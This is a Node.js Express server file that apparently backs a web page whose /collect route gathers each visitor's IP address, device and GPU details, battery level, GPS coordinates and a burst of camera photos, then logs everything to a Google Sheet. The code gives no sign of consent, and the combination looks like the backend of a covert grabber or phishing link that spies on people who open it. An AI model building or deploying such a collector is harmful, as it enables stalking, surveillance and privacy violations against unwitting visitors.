const express = require('express');
const { google } = require('googleapis');
const cors = require('cors');
const path = require('path');
const app = express();

// SETTINGS
app.use(cors());
// This allows the high-quality burst photos to be sent
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// 1. SERVE THE WEBSITE
// This tells Render: "When someone visits my link, show them index.html"
app.use(express.static(__dirname));
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 2. GOOGLE SHEETS SETUP
const auth = new google.auth.GoogleAuth({
    credentials: {
        client_email: process.env.GOOGLE_CLIENT_EMAIL,
        private_key: process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n'),
    },
    scopes: ['https://www.googleapis.com/auth/spreadsheets'],
});
const sheets = google.sheets({ version: 'v4', auth });

// 3. THE "COLLECT" ROUTE
// This matches the button in your index.html
app.post('/collect', async (req, res) => {
    try {
        const { ts, ua, gpu, battery, loc, burstImages } = req.body;
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;

        // Prepare the photos: we combine them into a single cell
        const photoData = burstImages ? burstImages.join(' | ') : "No Photos";

        await sheets.spreadsheets.values.append({
            spreadsheetId: process.env.GOOGLE_SHEET_ID,
            range: 'Sheet1!A1',
            valueInputOption: 'USER_ENTERED',
            requestBody: {
                values: [[
                    ts,                       // Column A: Date/Time
                    ip,                       // Column B: IP Address
                    ua,                       // Column C: Device Info
                    `Level: ${battery.level}%`, // Column D: Battery
                    gpu.renderer,             // Column E: GPU/Model
                    `Lat:${loc.lat}, Lon:${loc.lon}`, // Column F: Location
                    photoData.substring(0, 45000) // Column G: Photo Strings
                ]]
            }
        });

        console.log(`✅ Success: Data received from IP ${ip}`);
        res.status(200).send("Logged to Google Sheet");
    } catch (error) {
        console.error('❌ Error:', error);
        res.status(500).send("Server Error: " + error.message);
    }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`🚀 Website live on port ${PORT}`));
